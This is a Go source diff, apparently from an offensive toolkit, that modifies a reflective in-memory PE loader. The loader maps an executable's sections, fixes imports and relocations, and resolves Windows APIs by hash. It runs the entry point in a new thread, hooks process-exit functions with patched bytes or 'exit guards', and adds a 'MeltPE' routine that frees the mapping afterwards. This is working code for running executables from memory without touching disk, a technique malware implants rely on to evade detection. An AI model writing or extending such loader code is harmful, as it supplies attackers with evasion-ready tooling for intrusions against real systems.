 	tgtFile.OptionalHeader.ImageBase = uint64(imageBaseForPE)
 	mappedNtHeader.OptionalHeader.ImageBase = uint64(imageBaseForPE)
 
 	if err := CopySections(peF, &pinnedBytes, imageBaseForPE); err != nil {
-		return fmt.Errorf("[ERROR] failed to copy sections: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to copy sections: %v", err)
 	}
 
 	if err := fixImportAddressTable(imageBaseForPE, peF); err != nil {
-		return fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
+		return nil, fmt.Errorf("[ERROR] failed to fix import address table: %v", err)
 	}
 
 	if imageBaseForPE != uintptr(preferableAddress) {
 		if relocTable != nil {
 			if err := fixRelocTable(imageBaseForPE, uintptr(preferableAddress), (*IMAGE_DATA_DIRECTORY)(unsafe.Pointer(relocTable))); err != nil {
-				return fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
+				return nil, fmt.Errorf("[ERROR] failed to fix relocation table: %v", err)
 			}
 		}
 	}
 	
 	entryPointRVA := mappedNtHeader.OptionalHeader.AddressOfEntryPoint
-	startAddress := imageBaseForPE + uintptr(entryPointRVA)
-	Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
+    startAddress := imageBaseForPE + uintptr(entryPointRVA)
+    Memset(baseAddr, 0, uintptr(len(pinnedBytes)))
 	
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	_, err = api.Call("kernel32.dll", "ConvertThreadToFiber", uintptr(0))
-	if err != nil {
-		return fmt.Errorf("[ERROR] failed to convert thread to fiber: %v", err)
-	}
-	
-	// when i remove this it breaks but i dont think its doing anything
-	peFiberAddr, err := api.Call("kernel32.dll", "CreateFiber", uintptr(0x100000), startAddress, uintptr(0))
-	if err != nil {
-		api.Call("kernel32.dll", "ConvertFiberToThread")
-		return fmt.Errorf("[ERROR] failed to create PE fiber: %v", err)
-	}
-	api.Call("kernel32.dll", "DeleteFiber", peFiberAddr)
-	api.Call("kernel32.dll", "ConvertFiberToThread")
-	
-	var threadHandle uintptr
-	status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0x1, 0, 0, 0, 0) // CREATE_SUSPENDED = 0x1
-	if status != 0 {
-		return fmt.Errorf("[ERROR] failed to create suspended thread (status: 0x%x, err: %v)", status, err)
-	}
-	
-	exitFunctions := []string{"ExitProcess", "TerminateProcess", "exit", "_exit"}
-	originalBytesMap := make(map[uintptr][]byte)
-	
-	kernel32Handle := api.LoadLibraryW("kernel32.dll")
-	msvcrtHandle := api.LoadLibraryW("msvcrt.dll")
-	
-	for _, funcName := range exitFunctions {
-		var funcAddr uintptr
-		
-		if funcName == "exit" || funcName == "_exit" {
-			if msvcrtHandle != 0 {
-				funcHash := api.GetHash(funcName)
-				funcAddr = api.GetFunctionAddress(msvcrtHandle, funcHash)
-			}
-		} else {
-			if kernel32Handle != 0 {
-				funcHash := api.GetHash(funcName)
-				funcAddr = api.GetFunctionAddress(kernel32Handle, funcHash)
-			}
-		}
-		
-		if funcAddr != 0 {
-			originalBytes := make([]byte, 5)
-			for i := 0; i < 5; i++ {
-				originalBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
-			}
-			originalBytesMap[funcAddr] = originalBytes
-			var oldProtect uint32
-			api.Call("kernel32.dll", "VirtualProtect", funcAddr, uintptr(5), uintptr(0x40), uintptr(unsafe.Pointer(&oldProtect)))
-			nopBytes := []byte{0xC3, 0x90, 0x90, 0x90, 0x90} // RET + NOPs
-			for i, b := range nopBytes {
-				*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
-			}
-		}
-	}
-	
-	status, err = sys.NtResumeThread(threadHandle, nil)
-	if status != 0 {
-		return fmt.Errorf("[ERROR] failed to resume thread (status: 0x%x)", status)
-	}
-	
-	api.Call("kernel32.dll", "Sleep", uintptr(timeoutSeconds*1000)) // Convert seconds to milliseconds
-	
-	status, err = sys.NtSuspendThread(threadHandle, nil)
-	if status == 0 {
-		status, err = sys.NtTerminateThread(threadHandle, 0)
-	} 
-	
-	for funcAddr, originalBytes := range originalBytesMap {
-		var oldProtect uint32
-		api.Call("kernel32.dll", "VirtualProtect", funcAddr, uintptr(5), uintptr(0x40), uintptr(unsafe.Pointer(&oldProtect)))
-		for i, b := range originalBytes {
-			*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
-		}
-	}
-	
-	sys.NtClose(threadHandle)
+    // Install global exit guards
+    stub, hooks, _ := installGlobalExitGuards()
+    defer func() { uninstallGlobalExitGuards(stub, hooks) }()
+
+    var threadHandle uintptr
+    status, err = sys.NtCreateThreadEx(&threadHandle, 0x1FFFFF, 0, 0xffffffffffffffff, startAddress, 0, 0, 0, 0, 0, 0)
+    if status != 0 {
+        uninstallGlobalExitGuards(stub, hooks)
+        return nil, fmt.Errorf("[ERROR] failed to create thread (status: 0x%x, err: %v)", status, err)
+    }
+
+    // Wait up to timeout, terminate if needed
+    waitRes, _ := api.Call("kernel32.dll", "WaitForSingleObject", threadHandle, uintptr(uint32(timeoutSeconds*1000)))
+    if waitRes == 0x00000102 { // WAIT_TIMEOUT
+        sys.NtTerminateThread(threadHandle, 0)
+    }
+
+    sys.NtClose(threadHandle)
 
 	runtime.KeepAlive(pinnedBytes)
 	runtime.KeepAlive(bytes0)
 	runtime.KeepAlive(&pinnedBytes[0])
 	
-	return nil	
+	mapping := createPEMapping(imageBaseForPE, regionSize)
+	return mapping, nil	
 }
 
+// Melt function for PE mappings - similar to DLL Melt
+func MeltPE(mapping *PEMapping) error {
+	if mapping == nil {
+		return fmt.Errorf("[ERROR] Invalid PE mapping provided")
+	}
+	
+	result, err := api.Call("kernel32.dll", "VirtualFree", mapping.BaseAddress, uintptr(0), uintptr(0x8000))
+	if err != nil {
+		return fmt.Errorf("[ERROR] VirtualFree failed: %v", err)
+	}
+	
+	if result == 0 {
+		return fmt.Errorf("[ERROR] VirtualFree returned 0 (failure)")
+	}
+	unregisterPE(mapping.BaseAddress)
+	
+	return nil
+}
+
+// GetPEMap returns: slice of base addresses, slice of sizes, and total count of mapped PEs
+func GetPEMap() ([]uintptr, []uintptr, int) {
+	peRegistryMutex.RLock()
+	defer peRegistryMutex.RUnlock()
+	
+	count := len(peRegistry)
+	baseAddresses := make([]uintptr, 0, count)
+	sizes := make([]uintptr, 0, count)
+	
+	for _, mapping := range peRegistry {
+		baseAddresses = append(baseAddresses, mapping.BaseAddress)
+		sizes = append(sizes, mapping.Size)
+	}
+	
+	return baseAddresses, sizes, count
+}
